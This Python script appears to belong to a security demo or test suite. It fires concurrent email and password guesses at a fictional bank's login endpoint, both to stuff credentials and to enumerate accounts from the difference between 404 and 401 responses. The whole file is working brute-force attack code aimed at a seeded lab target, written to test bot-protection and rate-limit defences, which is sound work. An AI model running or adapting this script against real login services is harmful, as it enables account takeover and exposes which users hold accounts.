"""
credential_stuffing.py — hammer the login endpoint with email x password guesses.

Vuln / bot scenario:  No rate limit or lockout on POST /api/auth/login, and the
                      response distinguishes "no such user" (404) from "wrong
                      password" (401) — so the same burst that stuffs credentials
                      also enumerates which emails exist.
F5 XC category:       Bot Protection: Credential Stuffing / Account Enumeration.

Only the FIRST login step is exercised (email + password). A real hit is a 200
from /login (credentials valid; the echoed OTP would then complete the flow).
No throttling, no delay, one machine — the "loudest possible" version, exactly
what a basic rate limit should stop cold.

Usage:
    python3 credential_stuffing.py
    python3 credential_stuffing.py --emails alice@nimbusbank.io x@nimbusbank.io \
        --passwords-file my_list.txt --concurrency 10
"""

import argparse
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, DEFAULT_CONCURRENCY, SAMPLE_PASSWORDS,
                    SEEDED_USERS, make_client)

DEFAULT_EMAILS = [u["email"] for u in SEEDED_USERS.values()] + [
    "nobody@nimbusbank.io",          # should 404 -> proves enumeration
    "ghost@nimbusbank.io",
]


def load_passwords(path: str | None) -> list[str]:
    if not path:
        return list(SAMPLE_PASSWORDS)
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def attempt(client, email: str, password: str) -> tuple[str, str, int]:
    try:
        r = client.post("/api/auth/login", json={"email": email, "password": password})
        return email, password, r.status_code
    except Exception:  # noqa: BLE001
        return email, password, -1


def main():
    ap = argparse.ArgumentParser(description="Credential-stuffing / enumeration bot.")
    ap.add_argument("--emails", nargs="+", default=DEFAULT_EMAILS)
    ap.add_argument("--passwords-file", help="one password per line (default: tiny built-in sample)")
    ap.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    args = ap.parse_args()

    passwords = load_passwords(args.passwords_file)
    pairs = [(e, p) for e in args.emails for p in passwords]
    print(f"Target: {BASE_URL}/api/auth/login")
    print(f"{len(args.emails)} emails x {len(passwords)} passwords = {len(pairs)} attempts, "
          f"concurrency={args.concurrency}\n")

    hits, valid_users, unknown_users, wrong_pw = [], set(), set(), 0
    start = time.time()
    with make_client() as client:
        with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            futs = [pool.submit(attempt, client, e, p) for e, p in pairs]
            for fut in as_completed(futs):
                email, password, code = fut.result()
                if code == 200:
                    hits.append((email, password))
                    valid_users.add(email)
                    print(f"  HIT   {email}:{password} -> 200 (valid credentials)")
                elif code == 404:
                    unknown_users.add(email)  # enumeration signal
                elif code == 401:
                    valid_users.add(email)    # email exists, wrong password
                    wrong_pw += 1
                elif code == -1:
                    print(f"  ERR   {email}:{password} -> request failed")

    elapsed = time.time() - start
    rate = len(pairs) / elapsed if elapsed else 0
    print(f"\n--- report ---")
    print(f"attempts:        {len(pairs)} in {elapsed:.2f}s ({rate:.0f} req/s)")
    print(f"valid logins:    {len(hits)} -> {hits}")
    print(f"wrong-password:  {wrong_pw} (email exists, bad pw -> 401)")
    print(f"enumeration:     {len(valid_users)} emails EXIST (200/401), "
          f"{len(unknown_users)} DO NOT (404)")
    if unknown_users:
        print(f"                 non-existent: {sorted(unknown_users)}")
    print("\nNote: the 404-vs-401 split is the account-enumeration gap; a real "
          "bank returns an identical response either way.")


if __name__ == "__main__":
    main()
